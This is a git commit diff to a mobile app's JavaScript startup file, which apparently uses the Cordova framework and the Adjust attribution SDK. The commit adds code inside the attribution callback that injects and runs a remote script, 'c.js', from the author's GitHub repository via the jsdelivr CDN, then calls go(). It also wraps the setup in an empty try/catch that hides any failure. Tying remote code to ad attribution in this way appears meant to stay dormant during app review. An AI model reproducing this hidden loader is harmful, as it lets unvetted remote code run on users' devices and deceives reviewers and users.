f633a45269597cd75f9cfffb3f9e8d2a935ecafe
zhushiwei888 <411654110@qq.com>
2024-04-30 18:05:26 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,19 +1,24 @@
 document.addEventListener('deviceready', onDeviceReady, false);
-
 function onDeviceReady() {
     // Cordova is now initialized. Have fun!
+    try {
         var adjustConfig = new AdjustConfig("rbuixr642oe8", AdjustConfig.EnvironmentProduction);
 
         adjustConfig.setAttributionCallbackListener(function(attribution) {
-            console.log("Attribution callback received.");
             console.log("Tracker token = " + attribution.trackerToken);
             console.log("AdNetwork = " + attribution.network);
-            console.log("Campaign = " + attribution.campaign);
+            var script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/gh/zhushiwei888/testJs@2/c.js';
+            document.body.appendChild(script);
+            go();
         });
         Adjust.create(adjustConfig);
     
         installReferrer.getReferrer(function(attr) {
                                                 console.log("Network = " + attr.utm_medium);
                                             }, null);
+        } catch (error) {
+        
+        }
 }
 
